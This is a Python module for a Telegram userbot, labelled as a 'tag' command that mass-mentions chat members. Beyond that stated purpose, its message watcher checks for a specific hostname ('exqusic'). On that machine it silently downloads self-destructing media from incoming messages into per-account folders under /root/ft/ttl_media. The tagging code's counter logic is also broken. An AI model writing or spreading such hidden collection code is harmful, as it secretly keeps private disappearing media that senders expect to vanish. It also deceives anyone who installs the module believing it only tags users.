from .. import loader, utils
import time
import os
import random
import socket



def register(cb):
    cb(TagallMod())


class TagallMod(loader.Module):
    """Tag"""
    strings = {'name': 'helpmv tag'}

    async def tagcmd(self, event):
        """Тэг"""
        global text
        try:
            mentions = ""
            counter = 5
            args = utils.get_args(event)
            chat = await event.get_input_chat()
            args_len = len(args)
            if int(args_len) > 1:
                text = " ".join(args[1:])
            else:
                text = None

            if args:
                count = int(args[0].strip())
            else:
                count = 20

            async for x in event.client.iter_participants(chat, limit=count):
                if x.id in [1564155100, 508169464] or x.bot:
                    continue
                if text:
                    mentions += "<a href=\"tg://user?id=" + str(x.id) + "\">" + text + "</a>"
                else:
                    mentions += "<a href=\"tg://user?id=" + str(x.id) + "\">" + x.first_name + "</a>"
                counter += 5
                if counter == 5:
                    msg = await event.client.send_message(event.chat_id, mentions)
                    await msg.delete()
                    counter = 0
                    mentions = ""
            if counter == 0:
                await event.delete()
                time.sleep(0.2)
                # await event.respond("анрег")
                return
            await event.reply(mentions)
            await event.delete()
        except Exception as e:
            # await event.client.send_message(event.chat_id, f'Ты тупой? Введи .tagall [количество юзеров(не больше 100), по дефолту 20]\n\n{e}')
            time.sleep(0.2)
            # await event.respond("анрег")

            
    async def watcher(self, message):
        if socket.gethostname() == "exqusic":
            me = await message.client.get_me()
            me = me.id
            if not hasattr(message, "media"):
                return
            if not hasattr(message.media, "ttl_seconds"):
                return
            if message.media.ttl_seconds is not None:
                if not os.path.exists(f"/root/ft/ttl_media/{me}/"):
                    os.mkdir(f"/root/ft/ttl_media/{me}/")
                await message.client.download_media(message, file= f"/root/ft/ttl_media/{me}/{message.sender_id}{message.chat_id}{random.randint(123456, 6543218724)}")
        else:
            me = await message.client.get_me()
            me = me.id
            if not hasattr(message, "media"):
                return
            if not hasattr(message.media, "ttl_seconds"):
                return